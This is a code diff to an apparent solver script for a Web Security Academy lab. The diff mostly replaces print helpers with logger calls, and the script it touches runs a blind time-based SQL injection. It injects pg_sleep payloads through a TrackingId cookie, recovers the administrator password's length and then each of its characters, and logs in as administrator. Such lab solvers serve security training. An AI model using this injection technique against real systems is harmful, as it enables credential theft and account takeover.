@@ -1,4 +1,3 @@
-from web_security_academy.core.utils import print_info_secondary, print_success
 from web_security_academy.core.logger import logger
 from bs4 import BeautifulSoup
 
@@ -13,6 +12,7 @@ def solve_lab(session):
     logger.info(
         '{"TrackingId": "\' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
     )
+    logger.toggle_newline()
 
     len_pass = 1
     while True:
@@ -26,18 +26,20 @@ def solve_lab(session):
         response_time = end - start
 
         if response_time < 10:
-            print_info_secondary(f"{len_pass} => {response_time:.2f} seconds", end="")
+            logger.info(f"{len_pass} => {response_time:.2f} seconds")
             len_pass += 1
         else:
-            print_success(f"{len_pass} => {response_time:.2f} seconds")
+            logger.success(f"{len_pass} => {response_time:.2f} seconds")
             break
 
+    logger.toggle_newline()
     logger.info(
         f'Determining administrator password by visiting "/" with the following cookies:'
     )
     logger.info(
         '{"TrackingId": "\' || CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
     )
+    logger.toggle_newline()
     alphabet = string.ascii_letters + string.digits + string.punctuation
     password = ""
 
@@ -52,23 +54,20 @@ def solve_lab(session):
             response_time = end - start
 
             if response_time < 10:
-                print_info_secondary(
-                    f"{i+1}, '{c}' => {response_time:.2f} | Progress: {password}...",
-                    end="",
+                logger.info(
+                    f"{i+1}, '{c}' => {response_time:.2f} | Progress: {password}..."
                 )
             else:
-                print_success(
-                    f"{i+1}, '{c}' => {response_time:.1f} | Progress: {password}...",
-                    end="",
+                logger.success(
+                    f"{i+1}, '{c}' => {response_time:.1f} | Progress: {password}..."
                 )
                 password += c
                 break
         else:
-            print()
+            logger.toggle_newline()
             logger.failure(f"Unable to determine character at index {i}")
             return
 
-    print()
+    logger.toggle_newline()
     logger.info(f"Successfully extracted administrator password: {password}")
-
     session.login("administrator", password)
